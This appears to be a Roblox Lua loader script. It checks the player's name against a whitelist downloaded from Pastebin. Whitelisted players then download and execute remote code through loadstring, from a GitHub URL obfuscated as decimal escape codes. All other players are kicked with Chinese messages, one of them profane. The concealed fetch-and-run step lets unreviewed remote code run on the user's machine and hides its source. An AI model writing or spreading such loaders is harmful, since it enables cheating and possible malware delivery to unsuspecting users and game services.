local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local playerName = localPlayer.Name

local success, whitelistData = pcall(function()
    return game:HttpGet("https://pastebin.com/raw/n2y94cnE")
end)

if success and whitelistData then
    local whitelist = {}
    for name in whitelistData:gmatch("[^\r\n]+") do
        whitelist[name:lower()] = true
    end

    if whitelist[playerName:lower()] then
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\120\105\97\107\50\55\47\54\51\55\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\115\109\97\108\108\37\50\48\101\109\112\116\121\37\50\48\115\99\114\105\112\116\46\108\117\97"))()
    else
        localPlayer:Kick("有白名单吗就执行")
        wait(2)
    end
else
    localPlayer:Kick("你妈的咋还不退😡")
    wait(2)
end
